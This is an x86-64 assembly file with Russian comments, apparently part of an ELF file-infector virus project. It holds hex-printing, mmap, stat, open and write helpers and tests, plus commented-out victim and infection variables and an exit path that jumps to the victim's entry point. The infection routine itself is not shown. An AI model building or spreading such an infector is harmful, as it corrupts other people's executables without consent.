// //     add     $0x2, %rcx

// //     mov     $e_version_msg, %rdi
// //     movzwl  (%rcx), %esi
// //     mov     $0x10, %rdx
// //     mov     $0x12, %r8
// //     call    my_printf

// //     add     $0x4, %rcx

// //     mov     $e_entry_msg, %rdi
// //     movzwl  (%rcx), %esi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     add     $0x8, %rcx

// //     mov     $e_phoff_msg, %rdi
// //     mov     (%rcx), %rsi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     add     $0x8, %rcx

// //     mov     $e_shoff_msg, %rdi
// //     mov     (%rcx), %rsi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     add     $0x8, %rcx

// //     mov     $e_ehsize_msg, %rdi
// //     movl    (%rcx), %esi
// //     mov     $0x10, %rdx
// //     mov     $0x11, %r8
// //     call    my_printf

// //     add     $4, %rcx

// //     mov     $e_flags_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx, %esi
// //     mov     $0x10, %rdx
// //     mov     $0xf, %r8
// //     call    my_printf

// //     add     $2, %rcx

// //     mov     $e_phentsize_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx, %esi
// //     mov     $0x10, %rdx
// //     mov     $0x14, %r8
// //     call    my_printf

// //     add     $2, %rcx

// //     mov     $e_phnum_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx, %esi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     add     $2, %rcx

// //     mov     $e_shentsize_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx, %esi
// //     mov     $0x10, %rdx
// //     mov     $0x14, %r8
// //     call    my_printf

// //     add     $2, %rcx

// //     mov     $e_shnum_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx, %esi
// //     mov     $0x10, %rdx
// //     mov     $0x10, %r8
// //     call    my_printf

// //     add     $2, %rcx

// //     mov     $e_shstrndx_msg, %rdi
// //     movzwl  (%rcx), %edx
// //     movzwl  %dx, %esi
// //     mov     $0x10, %rdx
// //     mov     $0x13, %r8
// //     call    my_printf

// //     pop     %r8
// //     pop     %rcx
// //     pop     %rdx
// //     pop     %rsi

// //     pop     %rbp
// //     ret


//     // CONVERTED_ADDR
//     /* Побайтово конвертирует число в ascii-кода для вывода в шестнадцатеричном формате
//     @PARAMS
//     - %RSI - указатель на массив, в котором лежит число

//     Данную функцию можно использовать только после конвертации числа в
//     16-байтовый массив (см. cnvrt_addr_in_16_byte)

//     Если число в текущем байте < 9, оно будет сковертировано в аски-код цифры,
//     в противном случае число бдет сконвертировано в букву

//     Сконвертированное в аски-коды число записывается в массив converted_addr,
//     в последний байт массива вписывается символ перевода строки для удобства вывода
//     числа в будущем (возможно, перевод строки стоит убрать ?)

//     */

// converted_addr:
//     .space 0x11, 0

//     .globl  cnvrt_num_to_hex_string
// 	.type	cnvrt_num_to_hex_string, @function

// cnvrt_num_to_hex_string:
//     push    %rax
//     push    %rdi
//     push    %rcx

//     lea     converted_addr(%rip), %rdi   # вписали перевод строки
//     add     $0x10, %rdi
//     movb    $0xA,  (%rdi)

//     lea     converted_addr(%rip), %rdi
//     mov     $0x10, %rcx                  # loop cntr

// cnvrt_num_cycle:
//     // TAKE CUR. NUM
//     xor     %rax, %rax
//     movb    (%rsi), %al

//     // NUMBER OR LETTER?
//     cmp     $0x09, %rax                   # число или буква?
//     jg      cnvrt_in_letter

//     // NUMER
//     add     $0x30,  %al                   # сконвертировать аски-код числа
//     jmp     continue_cycle

//     // LETTER
// cnvrt_in_letter:
//     add     $0x57, %al                    # сконвертировать аски-код числа

//     // WRITE DOWN ASCII-CODE
// continue_cycle:
//     movb    %al, (%rdi)

//     inc     %rsi
//     inc     %rdi
//     loop    cnvrt_num_cycle

// cnvrt_num_end:
//     popq    %rcx
//     popq    %rdi
//     popq    %rax

// 	ret

// // test_cnvrt_num_to_hex_string:

// //     pushq   %rbp
// // 	movq    %rsp, %rbp

// //     mov     $byted_addr, %rdi
// //     mov     $0x10, %rsi

// //     call    clear_array
// //     mov     $byted_addr, %rsi

// //     movb    $0x01, (%rsi)

// //     call    cnvrt_num_to_hex_string

// //     mov     $0x0, %rdi
// //     mov     $converted_addr, %rsi
// //     mov     $0x11, %rdx
// //     call    write

// //     popq    %rbp
// // 	ret

// //  # принимает в rdi адрес массив, в rsi - его размер, заполняет массив нулями
// // clear_array:
// //     pushq   %rbp
// // 	movq    %rsp, %rbp

// //     push    %rcx
// //     mov     %rsi, %rcx

// // clear_array_cycle:
// //     movb    $0x0, (%rdi)
// //     inc     %rdi
// //     loop    clear_array_cycle

// // clear_array_end:

// //     pop     %rcx
// //     popq    %rbp
// // 	ret

//      /* MY_PRINTF
//     Отладочный вывод. Может вывести строку, число, или и то, и то.

//     @PARAMS
//     # принимает в rdi строку, которую нужно вывести,
//     # в rsi - число для вывода
//     # в rdx - основание системы счисления, в которой надо вывести число
//     # или 0, если вывода числа нет,
//     # в r8 - размер строки, если она есть TODO в rcx
//     */

// // my_printf:
// //     push    %rcx
// //     push    %rax
// //     push    %rdx

// //     mov     %rdi, %rcx
// //     mov     %rsi, %rax

// //     cmp     $0, %rdx
// //     je      print_string

// //     cmp     $16, %rdx
// //     je      cnvrt_hex_num

// //     jmp     print_string

// // cnvrt_hex_num:
// //     mov     $byted_addr, %rdi   # очищаем массив (там могло быть другое число)
// //     mov     $0x10, %rsi

// //     call    clear_array

// //     mov     $converted_addr, %rdi
// //     mov     $0x11, %rsi

// //     call    clear_array

// //     mov     %rax, %rdi               # забираем число
// //     call    cnvrt_addr_in_16_byte

// //     mov     $byted_addr, %rsi
// //     call    cnvrt_num_to_hex_string   # преобразовываем в строку

// // print_string:
// //     mov     %rcx, %rsi # забрали строку

// //     cmp     $0, %rsi
// //     je      print_num

// //     mov     $0, %rdi

// //     mov     %r8, %rdx
// //     call    write

// // print_num:
// //     pop     %rdx      # забрали снование системы счисления
// //     cmp     $0, %rdx
// //     je      my_printf_end

// //     xor     %rdi, %rdi
// //     mov     $converted_addr, %rsi
// //     mov     $0x11, %rdx

// //     call    write

// // my_printf_end:
// //     pop     %rax
// //     pop     %rcx
// // 	ret

// // test_my_printf1:
// //     mov     $msg, %rdi
// //     mov     $0x3041d23e2, %rsi
// //     mov     $0x10, %rdx
// //     mov     $0x13, %r8

// //     call    my_printf
// // 	ret

// // test_my_printf2:
// //     mov     $0x0, %rdi
// //     mov     $0x3041d23e2, %rsi
// //     mov     $0x10, %rdx
// //     mov     $0x0, %r8

// //     call    my_printf

// //     ret

// // test_my_printf3:

// //     mov     $msg, %rdi
// //     mov     $0x0, %rsi
// //     mov     $0x0, %rdx
// //     mov     $0x13, %r8

// //     call    my_printf
// // 	ret


//     /* CNVRT_ADDR_IN_16_BYTE
//     Конвертирует восьмибайтовое число в такое же 16-байтовое, т.е. каждые полбайта
//     занимают байт на выходе. Конвертация начинается с младших радряов числа.
//     Сконвертированное число записывается в массив byted_addr

//      Конвертация происходит за 16 итераций цикла, на каждой итерации:
//     - на конвертируемое число накладывается маска
//     - полученное число сдвигается вправо на 4 бита столько раз,
//       сколько было итераций цикла, чтоб результат оказался в младших разрядах
//     - результат записывается в следующий доступный байт массива byted_addr
//     - маска сдвигается на 4 бита влево */

//     /* * @PARAMS
//        * %RDI - число для конвертирования */

// byted_addr:
//     .space  16, 0

// cnvrt_addr_in_16_byte:
//     push    %r8
//     push    %r9
//     push    %rcx
//     push    %rdx
//     push    %rbx
//     push    %rsi

//     // SETUP VALUES
//     mov     %rdi, %rdx
//     lea     byted_addr(%rip), %rsi

//     add     $0xF, %rsi    # конвертация начинается с младниших байт числа
//     mov     $0x10, %rcx   # loop cntr

//     mov     $0xF, %rbx     # маска для числа

//    // CONVERT NUMBER
// cnvrt_addr_loop:
//     and     %rbx, %rdx    # наложитьм маску на число

//     mov     $0x10, %r8    # высчитать кол-во пройденных итераций
//     mov     %rcx, %r9
//     sub     %r9, %r8

//     // ROTATE NUM RIGHT
// rotate_num_right:
//     cmp     $0, %r8
//     jle     continue_cnvrt_addr_loop

//     shr     $0x4, %rdx
//     dec     %r8
//     jmp     rotate_num_right

// continue_cnvrt_addr_loop:
//     movb    %dl, (%rsi)   # записать число по адресу
//     mov     %rdi, %rdx    # восстановить исходное число
//     shl     $0x4, %rbx    # сдвинуть маску на 4 бита влево
//     dec     %rsi          # сдвинуть укатель на следующий свободный байт массива

//     loop   cnvrt_addr_loop

//     pop     %rsi
//     pop     %rbx
//     pop     %rdx
//     pop     %rcx
//     pop     %r9
//     pop     %r8

//     ret

// // TEST_CNVRT_ADDR_IN_16_BYTE
// /* тестирует конвертацию числа
//     если не подключать конвертациж полученного числа и не выводить его на экран,
//     то посмотреть результат можно только в гдб
//     TODO решить эту проблему */

// // test_cnvrt_addr_in_16_byte:
// //     mov     $0xFFFFFFFF, %rdi
// //     call    cnvrt_addr_in_16_byte

// //     ret


//     // TEST_CNVRT_ADDR_IN_16_BYTE

// /*
//     цель теста:
//     - сконвертировать восьмибайтовое число в 16-байтовый массив
//     - сконвертировать каждый байт этого массива в ascii-код
//     - вывести полученное число в stdout */
// test_cnvrt_addr_in_16_byte:
//     pushq   %rbp
// 	movq    %rsp, %rbp

//     // mov     $0x40, %rdi        # тесты с разными числами
//     // mov     $0xFFFFFFFFFFFFFFFF, %rdi
//     // mov     $0x8FFFE, %rdi
//     mov     $0xDEADBEEFBAADF00D, %rdi
//     // mov     $-31, %rdi   # (?)

//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string

//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

//     popq    %rbp
// 	ret

// // test_fwrite:
// //     pushq   %rbp
// // 	movq    %rsp, %rbp

// //     mov     $array, %rdi
// //     mov     $msg, %rsi
// //     mov     $19, %rdx

// //     call    fwrite

// //     mov     %rax, %rdi
// //     mov     $msg2, %rsi
// //     mov     $20, %rdx
// //     call    fwrite

// //     mov     $0, %rdi
// //     mov     $array, %rsi
// //     mov     $39, %rdx

// //     call    write
// //     popq    %rbp
// // 	ret

    // MY_MMAP file into memory
    // Считывает файл в память по заданному адресу.
    // Флаги должны быть такими же, какие передавали
    // open дляоткрытия файла.
    // @PARAMS
    //  - %RDI - адрес для записи (по умолчанию NULL,
    //           в этом случае назначается OS)
    //  - %RSI - длина считываемого файла
    //  - %RDX - права доступа к памяти
    //           (RDONLY, RDWR и т.д.)
    //  - %RCX -  права для доступа к памяти для
    //            процессов (MMAP_SHARED, MMAP_PRIVATE)
    //  * %R8 -   fd считываемого файла
    //  * %R9 -   offset от начала считываемого файла
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10
	// push %r14
	// push %r15

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	// pop %r15
	// pop %r14
	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret

// /* MY_MEMCPY
//   Побайтово записывает данный в размере bytesz из памяти src в память dest

//  * @PARAMS
//  *   - %RDI - ptr dest
//  *   - %RSI - ptr src
//  *   - %RDX - bytesz
//  */

// my_memcpy:

//     pushq    %rcx
//     pushq    %rax

//     // loop cnt
//     movq     %rdx, %rcx

// cycle_my_memcpy:

//     movq	%rsi, %rax
//     movzbl	(%rax), %edx

// 	movq	%rdi, %rax
// 	movb	%dl, (%rax)

//     inc      %rdi
//     inc      %rsi

//     loop     cycle_my_memcpy

// my_memcpy_exit:
//     popq     %rax
//     popq     %rcx

//     ret

// // MY_MEMCPY TEST
// _memcpy_test_msg:
//    .ascii "Test memcpy msg\n"
//    .set len_memcpy_test_msg, . - _memcpy_test_msg

// memcpy_test_buf:
//     .space 40, 0

//     // цель теста: скопировать строку в буфер и вывести ее в stdout
// test_my_memcpy:
//     lea     memcpy_test_buf(%rip), %rdi
//     lea     _memcpy_test_msg(%rip), %rsi
//     mov     $len_memcpy_test_msg, %rdx

//     call    my_memcpy

//     mov     $0x1, %rdi
//     lea     memcpy_test_buf(%rip), %rsi
//     mov     $len_memcpy_test_msg, %rdx

//     call    _my_write
// 	ret


// MY_STAT
// @PARAMS
// %RDI - file name
// %RSI - stat struct pointer
_my_stat:
    // stat изменяет этот регистр
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~
    // NB: Any syscall destroys %rcx and %r11
    // Почему это происходит?
    // Инструкция входа в режим ядра syscall
    // сохраняет в регистре RCX значение RIP,
    // а в R11 – значение регистра флагов и
    // переходит к выполнению функции ядра
    // (адрес которой хранится в специальном
    // Model Specific -регистре).
    // Инструкция sysret же выполняет всё наоборот:
    // восстанавливает RIP из регистра RCX и регистр
    // флагов (почти весь) из регистра R11.
    // Поскольку в x64 кол-во регистров довольно
    // много, а RCX и R11 не участвуют в передаче
    // параметров, создатели системы решили не
    // заморачиваться с сохранением этих регистров
    // (возможно, заодно и для ускорения системного
    // вызова и возврата)
    push    %rcx

    mov     $0x04, %rax
    syscall
    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop    %rcx
  	ret
    ERR_MSG _my_stat "my_stat"


    // OPENFILE
    // Открывает файл с указанными флагами,
    // маппит его в память, возвращает
    // указатель на начало файла в памяти
    //
    // @PARAMS
    // %RDI - file name
    // %RSI - flags
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    mov     -0x70(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

    mov     $(PROT_READ | PROT_WRITE), %rdx # prot

    // call _my_mmap
    call    _my_mmap
    test    %rax, %rax
    jle     _openfile_ptr_error

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


// /* MY_FREAD

//     Читает bytesz n раз из спаменной памяти в указанную область памяти

//  * @PARAMS
//     * %RDI - dest
//     * %RSI - src
//     * %RDX - iter cntr
//     * %RCX - bytesz
//     */

// _my_fread:

//     push    %rcx
//     push    %rax
//     push    %rbx

//     mov     %rcx, %rbx
//     movq    %rdx, %rcx   # loop cnt

// cycle_fread:
//     mov    %rbx, %rdx
//     call    my_memcpy
//     loop    cycle_fread

// _fread_exit:
//     pop     %rbx
//     pop     %rax
//     pop     %rcx
// 	ret


// // TEST MY_FREAD

// /*
//     цель теста:
//     смаппить содержимое file_name в память, прочитать  данные из памяти в массив,
//     вывести прочитанное в stdout

//     у теста есть один недостаток: размер открытого файла не высчитывается,
//     а устанавливается вручную. На данный момент это 37 байт.
// */

// test_fread_filenm:
//     .string  "test_my_fread.txt"

// test_fread_buf:
//     .space 37, 0

// test_my_fread:

//     mov     $test_fread_filenm, %rdi
//     // mov     $dnt_exist_filenm, %rdi   # тест ошибки открытия файла

//     // MMAP FILE
//     mov     $O_RDWR, %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test_fread_exit

//     mov     %rax, %rbx

//     // SET PARAMS FOR MY_FREAD
//     lea     test_fread_buf(%rip), %rdi  # dest
//     mov     %rbx, %rsi                  # src
//     mov     $0x1, %rdx                  # iter cnt
//     mov     $0x25, %rcx                  # filesz

//     call    _my_fread

//     // PRINT RESULT
//     mov     $0x1, %rdi
//     lea     test_fread_buf(%rip), %rsi
//     mov     $0x25, %rdx                  # filesz
//     call    _my_write

// test_fread_exit:
// 	ret


// /* Close
//  * @PARAMS
//  *   - %RDI - fd
//  */
// close:
//     mov     $0x2, %rax
//     syscall
// 	ret

// // # принимает к rdi назначение
// // # в rsi - источник
// // # в rdx - кол-во байт, которое надо считать
// // # возвращает измененный указатель на назначение (назначение + кол-во записанных байт)
// // fwrite:

// //     pushq   %rbp
// // 	movq    %rsp, %rbp

// //     call    my_memcpy

// //     mov     %rdi, %rax
// //     popq    %rbp
// // 	ret
// // array:
// //     .space 40
// // fd:
// //     .long 0


// // victim_elf_addr:
// // 	.long 0

// // victim_phdr_table_addr:
// // 	.long 0

// // victim_phdr_table_size:
// // 	.long 0

// // victim_shdr_table_addr:
// // 	.long 0

// // victim_shdr_table_size:
// // 	.long 0

// // infected_seg_addr:
// // 	.long 0

// // infected_seg_size:
// // 	.long 0

// // infected_sect_addr:
// // 	.long 0

// // victim_code_before_infect_point_addr:
// // 	.long 0

// // victim_code_before_infect_point_size:
// // 	.long 0

// // victim_code_after_infect_point_addr:
// // 	.long 0

// // victim_code_after_infect_point_size:
// // 	.long 0

// // virus_code_addr:
// // 	.long 0

// // virus_code_size:
// // 	.long 0

// // infected_seg_vaddr_end:
// // 	.long 0

// // victim_phdr_amount:
// // 	.long 0

// // victim_shdr_amount:
// //     .long 0

_canary:
    .quad 0xDEADBEEFBAADF00D

_stack_top:
    .space 6000, 0
_stack_bottom:
    .quad 0


    // -------------------------------------------
_data:

// dnt_exist_filenm:
//     .string  "test2.txt"

// // file_name2:
// //     .string  "asm-test2.txt"

_file_name3:
    .string  "example"

// // virus_file_name:
// //     .string  "asm"

// // new_elf_file:
// //     .string "test_inf"
// // msg:
// //     .string "write test string \n"

// // msg2:
// //     .string "fwrite test string \n"

// // # сообщения, которые будут использоваться при распечатке полей эльф-хедера
// // e_type_msg:
// //     .string "ElfHdr e_type: "
// // e_machine_msg:
// //     .string "ElfHdr e_machine: "
// // e_version_msg:
// //     .string "ElfHdr e_version: "
// // e_entry_msg:
// //     .string "ElfHdr e_entry: "
// // e_phoff_msg:
// //     .string "ElfHdr e_phoff: "
// // e_shoff_msg:
// //     .string "ElfHdr e_shoff: "
// // e_ehsize_msg:
// //     .string "ElfHdr e_ehsize: "
// // e_flags_msg:
// //     .string "ElfHdr e_flags: "
// // e_phentsize_msg:
// //     .string "ElfHdr e_phentsize: "
// // e_phnum_msg:
// //     .string "ElfHdr e_phnum: "
// // e_shentsize_msg:
// //     .string "ElfHdr e_shentsize: "
// // e_shnum_msg:
// //     .string "ElfHdr e_shnum: "
// // e_shstrndx_msg:
// //     .string "ElfHdr e_shstrndx: "

// //  # сообщения, которые будут использоваться при распечатке полей заголовка программ
// // p_type_msg:
// //     .string "PhHdr p_type: "
// // p_flags_msg:
// //     .string "PhHdr p_flags: "
// // p_offset_msg:
// //     .string "PhHdr p_offset: "
// // p_vaddr_msg:
// //     .string "PhHdr p_vaddr: "
// // p_paddr_msg:
// //     .string "PhHdr p_paddr: "
// // p_filesz_msg:
// //     .string "PhHdr p_filesz: "
// // p_memsz_msg:
// //     .string "PhHdr p_memsz: "
// // p_align_msg:
// //     .string "PhHdr p_align: "

// // # сообщения, которые будут использоваться при распечатке полей заголовка секций
// // sh_name_msg:
// //     .string "ShHdr sh_name: "
// // sh_type_msg:
// //     .string "ShHdr sh_type: "
// // sh_flags_msg:
// //     .string "ShHdr sh_flags: "
// // sh_addr_msg:
// //     .string "ShHdr sh_addr: "
// // sh_offset_msg:
// //     .string "ShHdr sh_offset: "
// // sh_size_msg:
// //     .string "ShHdr sh_size: "
// // sh_link_msg:
// //     .string "ShHdr sh_link: "
// // sh_info_msg:
// //     .string "ShHdr sh_info: "
// // sh_addralign_msg:
// //     .string "ShHdr sh_addralign: "
// // sh_entsize_msg:
// //     .string "ShHdr sh_entsize: "

// // next_str:
// //     .string "\n"

// WRITE TO STDOUT
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_my_write:
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
    ret

// ERROR HANDLING
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp _end_infector

_end_infector:
    mov     _old_rsp(%rip), %rsp     # restore old %RSP
    jmp     _start_victim
 _fin_infector:
     nop
